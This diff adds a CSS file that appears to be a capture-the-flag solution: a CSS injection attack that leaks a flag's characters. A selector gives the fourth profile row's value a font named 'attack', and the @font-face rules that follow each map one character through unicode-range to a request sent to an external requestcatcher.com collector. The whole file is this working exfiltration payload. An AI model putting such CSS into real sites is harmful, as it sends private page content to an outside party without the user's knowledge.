@@ -1,0 +1,45 @@
+@charset "UTF-8";
+
+.profile-info .profile-row:nth-child(4) .value {
+    font-family: attack !important;
+    font-size: 16px;
+    display: inline;
+}
+
+@font-face {
+    font-family: attack;
+    src: url('https://css_task_test.requestcatcher.com/flag?v');
+    unicode-range: U+0076;
+}
+@font-face {
+    font-family: attack;
+    src: url('https://css_task_test.requestcatcher.com/flag?k');
+    unicode-range: U+006B; 
+}
+
+@font-face {
+    font-family: attack;
+    src: url('https://css_task_test.requestcatcher.com/flag?a');
+    unicode-range: U+0061; 
+}
+
+@font-face {
+    font-family: attack;
+    src: url('https://css_task_test.requestcatcher.com/flag?g');
+    unicode-range: U+0067;
+}
+@font-face {
+    font-family: attack;
+    src: url('https://css_task_test.requestcatcher.com/flag?%7B');
+    unicode-range: U+007B;
+}
+@font-face {
+    font-family: attack;
+    src: url('https://css_task_test.requestcatcher.com/flag?%7D');
+    unicode-range: U+007D; 
+}
+@font-face {
+    font-family: attack;
+    src: url('https://css_task_test.requestcatcher.com/flag?_');
+    unicode-range: U+005F; 
+}
